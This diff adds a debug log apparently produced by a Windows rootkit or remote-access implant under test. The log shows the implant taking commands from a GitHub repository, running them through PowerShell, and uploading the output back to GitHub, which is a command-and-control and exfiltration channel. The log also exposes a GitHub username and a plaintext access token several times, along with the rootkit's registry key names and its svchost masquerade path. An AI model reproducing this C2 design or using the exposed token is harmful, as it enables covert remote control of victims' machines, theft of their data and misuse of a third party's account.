@@ -1,0 +1,162 @@
+Mon Aug 23 01:05:33 2021. Initialisation of the log file.
+
+DEBUG: Mon Aug 23 01:05:33 2021: GithubLogin: hidemepls785
+DEBUG: Mon Aug 23 01:05:33 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Mon Aug 23 01:05:33 2021: GihubAccessToken: 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
+DEBUG: Mon Aug 23 01:05:33 2021: Rootkit Name: CorepPreprod2
+DEBUG: Mon Aug 23 01:05:33 2021: Rootkit Registry Key: Sensors
+DEBUG: Mon Aug 23 01:05:33 2021: Run Registry Key Name: test
+DEBUG: Mon Aug 23 01:05:33 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Mon Aug 23 01:05:33 2021: The folder list for random folder is not empty. Its size is: 4000
+DEBUG: Mon Aug 23 01:05:33 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp
+DEBUG: Mon Aug 23 01:05:34 2021: Start of a new loop to get commands and treat them.
+DEBUG: Mon Aug 23 01:05:34 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Aug 23 01:05:34 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Aug 23 01:05:34 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Aug 23 01:05:34 2021: Getting this command from the github repo: execute_cmd Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer"
+DEBUG: Mon Aug 23 01:05:34 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Aug 23 01:05:34 2021: Command received: execute_cmd
+DEBUG: Mon Aug 23 01:05:34 2021: The following command will be executed by powershell: Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer" > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:35 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:35 2021: The file that will be read weight: 0
+DEBUG: Mon Aug 23 01:05:35 2021: Success to read the binary file. This number of bytes have been read: 1
+DEBUG: Mon Aug 23 01:05:35 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Mon Aug 23 01:05:35 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Aug 23 01:05:35 2021: The content size that will be written: 1
+DEBUG: Mon Aug 23 01:05:35 2021: Success to write the content(number of bytes : 1) in the file : C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:35 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Mon Aug 23 01:05:35 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Aug 23 01:05:35 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:35 2021: The file that will be read weight: 1
+DEBUG: Mon Aug 23 01:05:35 2021: Success to read the binary file. This number of bytes have been read: 2
+DEBUG: Mon Aug 23 01:05:36 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log has been uploaded successfully in the github repo
+DEBUG: Mon Aug 23 01:05:36 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:05:36 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:05:36 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Aug 23 01:05:36 2021: The place of the rootkit has not been found on the json
+DEBUG: Mon Aug 23 01:05:36 2021: Start of a new loop to get commands and treat them.
+DEBUG: Mon Aug 23 01:05:36 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Aug 23 01:05:37 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Aug 23 01:05:37 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Aug 23 01:05:37 2021: Getting this command from the github repo: execute_cmd Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer"
+DEBUG: Mon Aug 23 01:05:37 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Aug 23 01:05:37 2021: Command received: execute_cmd
+DEBUG: Mon Aug 23 01:05:37 2021: The following command will be executed by powershell: Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer" > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:37 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:37 2021: The file that will be read weight: 1
+DEBUG: Mon Aug 23 01:05:37 2021: Success to read the binary file. This number of bytes have been read: 2
+DEBUG: Mon Aug 23 01:05:37 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Mon Aug 23 01:05:37 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Aug 23 01:05:37 2021: The content size that will be written: 2
+DEBUG: Mon Aug 23 01:05:37 2021: Success to write the content(number of bytes : 2) in the file : C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:37 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Mon Aug 23 01:05:37 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Aug 23 01:05:37 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:37 2021: The file that will be read weight: 2
+DEBUG: Mon Aug 23 01:05:37 2021: Success to read the binary file. This number of bytes have been read: 3
+DEBUG: Mon Aug 23 01:05:37 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log has not been uploaded in the github repo with the name: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\sophie\\AppData\\Local\\Packages\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\AC\\Temp\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Mon Aug 23 01:05:37 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log credentials: hidemepls785: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
+DEBUG: Mon Aug 23 01:05:37 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:05:37 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:05:37 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Aug 23 01:05:38 2021: The place of the rootkit has not been found on the json
+DEBUG: Mon Aug 23 01:05:38 2021: Start of a new loop to get commands and treat them.
+DEBUG: Mon Aug 23 01:05:38 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Aug 23 01:05:38 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Aug 23 01:05:38 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Aug 23 01:05:38 2021: Getting this command from the github repo: execute_cmd Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer"
+DEBUG: Mon Aug 23 01:05:38 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Aug 23 01:05:38 2021: Command received: execute_cmd
+DEBUG: Mon Aug 23 01:05:38 2021: The following command will be executed by powershell: Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer" > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:38 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:38 2021: The file that will be read weight: 0
+DEBUG: Mon Aug 23 01:05:38 2021: Success to read the binary file. This number of bytes have been read: 1
+DEBUG: Mon Aug 23 01:05:38 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Mon Aug 23 01:05:38 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Aug 23 01:05:38 2021: The content size that will be written: 1
+DEBUG: Mon Aug 23 01:05:38 2021: Success to write the content(number of bytes : 1) in the file : C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:39 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Mon Aug 23 01:05:39 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Aug 23 01:05:39 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:39 2021: The file that will be read weight: 1
+DEBUG: Mon Aug 23 01:05:39 2021: Success to read the binary file. This number of bytes have been read: 2
+DEBUG: Mon Aug 23 01:05:39 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log has not been uploaded in the github repo with the name: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\sophie\\AppData\\Local\\Packages\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\AC\\Temp\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Mon Aug 23 01:05:39 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log credentials: hidemepls785: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
+DEBUG: Mon Aug 23 01:05:39 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:05:39 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:05:39 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Aug 23 01:05:39 2021: The place of the rootkit has not been found on the json
+DEBUG: Mon Aug 23 01:05:39 2021: Start of a new loop to get commands and treat them.
+DEBUG: Mon Aug 23 01:05:39 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Aug 23 01:05:40 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Aug 23 01:05:40 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Aug 23 01:05:40 2021: Getting this command from the github repo: execute_cmd Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer"
+DEBUG: Mon Aug 23 01:05:40 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Aug 23 01:05:40 2021: Command received: execute_cmd
+DEBUG: Mon Aug 23 01:05:40 2021: The following command will be executed by powershell: Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer" > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:40 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:40 2021: The file that will be read weight: 0
+DEBUG: Mon Aug 23 01:05:40 2021: Success to read the binary file. This number of bytes have been read: 1
+DEBUG: Mon Aug 23 01:05:40 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Mon Aug 23 01:05:40 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Aug 23 01:05:40 2021: The content size that will be written: 1
+DEBUG: Mon Aug 23 01:05:40 2021: Success to write the content(number of bytes : 1) in the file : C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:40 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Mon Aug 23 01:05:40 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Aug 23 01:05:40 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:40 2021: The file that will be read weight: 1
+DEBUG: Mon Aug 23 01:05:40 2021: Success to read the binary file. This number of bytes have been read: 2
+DEBUG: Mon Aug 23 01:05:40 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log has not been uploaded in the github repo with the name: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\sophie\\AppData\\Local\\Packages\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\AC\\Temp\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Mon Aug 23 01:05:40 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log credentials: hidemepls785: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
+DEBUG: Mon Aug 23 01:05:40 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:05:40 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:05:40 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Aug 23 01:05:41 2021: The place of the rootkit has not been found on the json
+DEBUG: Mon Aug 23 01:05:41 2021: Start of a new loop to get commands and treat them.
+DEBUG: Mon Aug 23 01:05:41 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Aug 23 01:05:41 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Aug 23 01:05:41 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Aug 23 01:05:41 2021: Getting this command from the github repo: execute_cmd Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer"
+DEBUG: Mon Aug 23 01:05:41 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Aug 23 01:05:41 2021: Command received: execute_cmd
+DEBUG: Mon Aug 23 01:05:41 2021: The following command will be executed by powershell: Reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer" > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:41 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:41 2021: The file that will be read weight: 0
+DEBUG: Mon Aug 23 01:05:41 2021: Success to read the binary file. This number of bytes have been read: 1
+DEBUG: Mon Aug 23 01:05:41 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Mon Aug 23 01:05:41 2021: Start of the method writeFileWindowsApi.
+DEBUG: Mon Aug 23 01:05:41 2021: The content size that will be written: 1
+DEBUG: Mon Aug 23 01:05:41 2021: Success to write the content(number of bytes : 1) in the file : C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:41 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Mon Aug 23 01:05:41 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Mon Aug 23 01:05:41 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log
+DEBUG: Mon Aug 23 01:05:41 2021: The file that will be read weight: 1
+DEBUG: Mon Aug 23 01:05:41 2021: Success to read the binary file. This number of bytes have been read: 2
+DEBUG: Mon Aug 23 01:05:42 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log has not been uploaded in the github repo with the name: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log. Here is the answer of the api : {
+  "message": "C:\\Users\\sophie\\AppData\\Local\\Packages\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\AC\\Temp\\target_command1.log does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Mon Aug 23 01:05:42 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\AC\Temp\target_command1.log credentials: hidemepls785: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
+DEBUG: Mon Aug 23 01:05:42 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Aug 23 01:05:42 2021: #####################################################
+
+DEBUG: Mon Aug 23 01:05:42 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Aug 23 01:05:42 2021: The place of the rootkit has not been found on the json
+DEBUG: Mon Aug 23 01:05:42 2021: Start of GithubCommunication::sendLogs
